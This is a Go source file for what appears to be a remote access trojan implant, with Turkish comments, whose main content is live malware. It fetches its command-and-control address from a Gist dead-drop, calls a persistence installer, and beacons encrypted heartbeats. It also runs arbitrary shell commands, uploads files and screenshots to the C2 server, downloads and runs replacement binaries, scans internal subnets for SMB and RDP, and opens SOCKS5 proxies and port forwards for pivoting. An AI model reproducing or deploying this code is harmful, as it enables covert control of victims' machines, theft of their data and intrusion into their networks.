package main

import (
	"bytes"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/kbinani/screenshot"
)

// Configuration
var (
	RESOLVER_URL = "https://gist.githubusercontent.com/..." // Gist linkini buraya koy
	C2URL        = ""
)

const (
	SleepTime   = 5 * time.Second
	JitterRange = 3
)

type Agent struct {
	ID       string `json:"id"`
	IP       string `json:"ip"`
	Hostname string `json:"hostname"`
	Platform string `json:"platform"`
	Username string `json:"username"`
}

type CommandResponse struct {
	ID     string `json:"id"`
	Output string `json:"output"`
}

type ServerResponse struct {
	Task string `json:"task"`
}

var agentID string

func main() {
	rand.Seed(time.Now().UnixNano())

	// 1. Resolve C2 Address
	resolveC2Address()

	// 2. Install Persistence
	// Bu fonksiyon senin persistence_windows.go dosyanın içinden çağrılacak
	installPersistence()

	// 3. Generate Identity
	agentID = generateAgentID()
	agentInfo := collectSystemInfo()

	// 4. Main Loop
	for {
		if C2URL == "" || C2URL == "Error" {
			resolveC2Address()
			time.Sleep(10 * time.Second)
			continue
		}

		task := beacon(agentInfo)
		if task != "" {
			output := processTask(task)
			sendResult(output)
		}

		sleepDuration := SleepTime + time.Duration(rand.Intn(JitterRange))*time.Second
		time.Sleep(sleepDuration)
	}
}

func resolveC2Address() {
	resp, err := http.Get(RESOLVER_URL)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	resolvedIP := strings.TrimSpace(string(body))
	if strings.HasPrefix(resolvedIP, "http") {
		C2URL = resolvedIP
	}
}

// beacon sends a heartbeat to the C2 server.
// NOW ENCRYPTED WITH AES-256
func beacon(info Agent) string {
	jsonData, err := json.Marshal(info)
	if err != nil {
		return ""
	}

	// [SECURITY] Encrypt
	encryptedData, err := Encrypt(string(jsonData))
	if err != nil {
		return ""
	}

	// Send Encrypted Data
	resp, err := http.Post(C2URL+"/heartbeat", "text/plain", bytes.NewBuffer([]byte(encryptedData)))
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return ""
	}

	// [SECURITY] Decrypt
	decryptedBody, err := Decrypt(string(body))
	if err != nil {
		return ""
	}

	var serverResp ServerResponse
	if err := json.Unmarshal([]byte(decryptedBody), &serverResp); err != nil {
		return ""
	}

	return serverResp.Task
}

// updateAgent downloads a new binary, replaces the current one, and restarts.
func updateAgent(url string) string {
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Sprintf("Update failed: Cannot find executable path. %v", err)
	}

	oldPath := exePath + ".old"
	os.Remove(oldPath)

	err = os.Rename(exePath, oldPath)
	if err != nil {
		return fmt.Sprintf("Update failed: Cannot rename current binary. %v", err)
	}

	resp, err := http.Get(url)
	if err != nil {
		os.Rename(oldPath, exePath)
		return fmt.Sprintf("Update failed: Download error. %v", err)
	}
	defer resp.Body.Close()

	out, err := os.Create(exePath)
	if err != nil {
		os.Rename(oldPath, exePath)
		return fmt.Sprintf("Update failed: Cannot create file. %v", err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return fmt.Sprintf("Update failed: Write error. %v", err)
	}

	cmd := exec.Command(exePath)
	cmd.Start()
	os.Exit(0)

	return "Updating..."
}

// sendResult sends output to C2.
// NOW ENCRYPTED WITH AES-256
func sendResult(output string) {
	data := CommandResponse{ID: agentID, Output: output}
	jsonData, _ := json.Marshal(data)

	// [SECURITY] Encrypt
	encryptedData, err := Encrypt(string(jsonData))
	if err != nil {
		return
	}

	http.Post(C2URL+"/result", "text/plain", bytes.NewBuffer([]byte(encryptedData)))
}

func processTask(cmd string) string {
	cmd = strings.TrimSpace(cmd)
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return ""
	}

	if parts[0] == "download" {
		if len(parts) < 3 {
			return "Usage: download <url> <path>"
		}
		return downloadFile(parts[1], parts[2])
	}

	if parts[0] == "upload" {
		if len(parts) < 2 {
			return "Usage: upload <local_path>"
		}
		return uploadFileToC2(parts[1])
	}

	if parts[0] == "update" {
		if len(parts) < 2 {
			return "Usage: update <URL>"
		}
		return updateAgent(parts[1])
	}

	if parts[0] == "sysinfo" {
		return getSystemDetails()
	}
	if parts[0] == "kill" || parts[0] == "uninstall" {
		os.Exit(0)
		return "Dead"
	}
	if parts[0] == "cd" && len(parts) >= 2 {
		os.Chdir(parts[1])
		return "CD OK"
	}
	if parts[0] == "screenshot" {
		return takeScreenshot()
	}

	if parts[0] == "scan" {
		if len(parts) < 2 {
			return "Usage: scan <target_ip> OR scan sweep <subnet_prefix>"
		}
		if parts[1] == "sweep" && len(parts) >= 3 {
			return pingSweep(parts[2])
		}
		return runNetworkScan(parts[1])
	}

	if parts[0] == "pivot" {
		if len(parts) < 3 {
			return "Usage: pivot socks <port> OR pivot fwd <local_port> <target_ip:port>"
		}
		if parts[1] == "socks" {
			return startSocks5(parts[2])
		} else if parts[1] == "fwd" && len(parts) >= 4 {
			return startPortForward(parts[2], parts[3])
		}
		return "Invalid pivot command."
	}

	// Bu fonksiyon senin shell_windows.go dosyanın içinden çağrılacak
	return executeShellCommand(cmd)
}

// --- PIVOT & NETWORK CAPABILITIES ---

func pingSweep(subnet string) string {
	var activeHosts []string
	var mu sync.Mutex
	var wg sync.WaitGroup
	for i := 1; i <= 254; i++ {
		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			conn, err := net.DialTimeout("tcp", ip+":445", 500*time.Millisecond)
			if err == nil {
				conn.Close()
				mu.Lock()
				activeHosts = append(activeHosts, ip+" [SMB-445]")
				mu.Unlock()
				return
			}
			conn, err = net.DialTimeout("tcp", ip+":80", 500*time.Millisecond)
			if err == nil {
				conn.Close()
				mu.Lock()
				activeHosts = append(activeHosts, ip+" [HTTP-80]")
				mu.Unlock()
				return
			}
			conn, err = net.DialTimeout("tcp", ip+":3389", 500*time.Millisecond)
			if err == nil {
				conn.Close()
				mu.Lock()
				activeHosts = append(activeHosts, ip+" [RDP-3389]")
				mu.Unlock()
				return
			}
		}(fmt.Sprintf("%s.%d", subnet, i))
	}
	wg.Wait()
	if len(activeHosts) == 0 {
		return "No active hosts found on " + subnet + ".x (Checked 80, 445, 3389)"
	}
	return "Active hosts on " + subnet + ".x:\n" + strings.Join(activeHosts, "\n")
}

func runNetworkScan(target string) string {
	ports := []string{"21", "22", "23", "80", "443", "445", "1433", "3306", "3389", "8080", "8443"}
	var results []string
	var mu sync.Mutex
	var wg sync.WaitGroup
	for _, p := range ports {
		wg.Add(1)
		go func(port string) {
			defer wg.Done()
			conn, err := net.DialTimeout("tcp", target+":"+port, 1*time.Second)
			if err == nil {
				conn.Close()
				mu.Lock()
				results = append(results, port)
				mu.Unlock()
			}
		}(p)
	}
	wg.Wait()
	if len(results) > 0 {
		return fmt.Sprintf("Scan %s: Open Ports: %s", target, strings.Join(results, ", "))
	}
	return fmt.Sprintf("Scan %s: No common ports open/Host down", target)
}

func startPortForward(listenPort, targetAddr string) string {
	l, err := net.Listen("tcp", "0.0.0.0:"+listenPort)
	if err != nil {
		return "PortFwd Error: " + err.Error()
	}
	go func() {
		for {
			conn, err := l.Accept()
			if err != nil {
				continue
			}
			go func() {
				defer conn.Close()
				remote, err := net.DialTimeout("tcp", targetAddr, 3*time.Second)
				if err != nil {
					return
				}
				defer remote.Close()
				go io.Copy(remote, conn)
				io.Copy(conn, remote)
			}()
		}
	}()
	return fmt.Sprintf("TCP Port forwarding started: Local port %s -> Remote %s", listenPort, targetAddr)
}

func startSocks5(port string) string {
	l, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		return "SOCKS5 Error: " + err.Error()
	}
	go func() {
		for {
			conn, err := l.Accept()
			if err != nil {
				continue
			}
			go handleSocks5(conn)
		}
	}()
	return "SOCKS5 Proxy server started directly on agent port " + port
}

func handleSocks5(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 256)
	_, err := io.ReadFull(conn, buf[:2])
	if err != nil || buf[0] != 0x05 {
		return
	}
	numMethods := int(buf[1])
	_, err = io.ReadFull(conn, buf[:numMethods])
	if err != nil {
		return
	}
	// No auth
	conn.Write([]byte{0x05, 0x00})

	// Request
	n, err := io.ReadAtLeast(conn, buf[:4], 4)
	if err != nil || buf[0] != 0x05 || buf[1] != 0x01 {
		return
	}
	var targetAddr string
	switch buf[3] {
	case 0x01: // IPv4
		_, err = io.ReadFull(conn, buf[:4])
		if err != nil {
			return
		}
		ip := net.IPv4(buf[0], buf[1], buf[2], buf[3]).String()
		_, err = io.ReadFull(conn, buf[:2])
		if err != nil {
			return
		}
		port := int(buf[0])<<8 | int(buf[1])
		targetAddr = fmt.Sprintf("%s:%d", ip, port)
	case 0x03: // Domain
		_, err = io.ReadFull(conn, buf[:1])
		if err != nil {
			return
		}
		domainLen := int(buf[0])
		_, err = io.ReadFull(conn, buf[:domainLen])
		if err != nil {
			return
		}
		domain := string(buf[:domainLen])
		_, err = io.ReadFull(conn, buf[:2])
		if err != nil {
			return
		}
		port := int(buf[0])<<8 | int(buf[1])
		targetAddr = fmt.Sprintf("%s:%d", domain, port)
	default:
		return
	}

	remote, err := net.Dial("tcp", targetAddr)
	if err != nil {
		conn.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // Host unreachable
		return
	}
	defer remote.Close()
	conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // Success

	go io.Copy(remote, conn)
	io.Copy(conn, remote)
}

func getSystemDetails() string {
	h, _ := os.Hostname()
	u, _ := user.Current()
	return fmt.Sprintf("Hostname: %s | User: %s | OS: %s", h, u.Username, runtime.GOOS)
}

func takeScreenshot() string {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return "Error: No active display found."
	}

	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return fmt.Sprintf("Error capturing screen: %s", err)
	}

	fileName := fmt.Sprintf("screen_%d.png", time.Now().Unix())
	file, err := os.Create(fileName)
	if err != nil {
		return fmt.Sprintf("Error creating temp file: %s", err)
	}

	if err := png.Encode(file, img); err != nil {
		file.Close()
		return fmt.Sprintf("Error encoding PNG: %s", err)
	}
	file.Close()

	uploadResult := uploadFileToC2(fileName)
	os.Remove(fileName)

	return fmt.Sprintf("Screenshot taken & uploaded! Result: %s", uploadResult)
}

func downloadFile(url, path string) string {
	out, err := os.Create(path)
	if err != nil {
		return "Error creating file"
	}
	defer out.Close()
	resp, err := http.Get(url)
	if err != nil {
		return "Error downloading"
	}
	defer resp.Body.Close()
	io.Copy(out, resp.Body)
	return "Downloaded"
}

func uploadFileToC2(path string) string {
	file, err := os.Open(path)
	if err != nil {
		return fmt.Sprintf("Error opening file: %s", err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("file", filepath.Base(path))
	if err != nil {
		return fmt.Sprintf("Error creating form file: %s", err)
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Sprintf("Error copying file content: %s", err)
	}
	writer.Close()

	req, err := http.NewRequest("POST", C2URL+"/upload", body)
	if err != nil {
		return fmt.Sprintf("Error creating request: %s", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Sprintf("Error uploading: %s", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		return "File uploaded successfully to C2!"
	}
	return fmt.Sprintf("Upload failed. Status: %s", resp.Status)
}

func collectSystemInfo() Agent {
	h, _ := os.Hostname()
	u, _ := user.Current()
	return Agent{ID: agentID, IP: getOutboundIP(), Hostname: h, Platform: runtime.GOOS, Username: u.Username}
}

func generateAgentID() string {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()

	// 1. Combine static system details to form a unique seed (Hostname + Username)
	uniqueSeed := hostname + "-" + currentUser.Username

	// 2. Generate an MD5 hash of the seed
	hash := md5.Sum([]byte(uniqueSeed))
	hashHex := hex.EncodeToString(hash[:])

	// 3. Return the hostname and the first 6 characters of the hash (e.g., DESKTOP-a1b2c3)
	return fmt.Sprintf("%s-%s", strings.ToUpper(hostname), hashHex[:6])
}

func getOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}
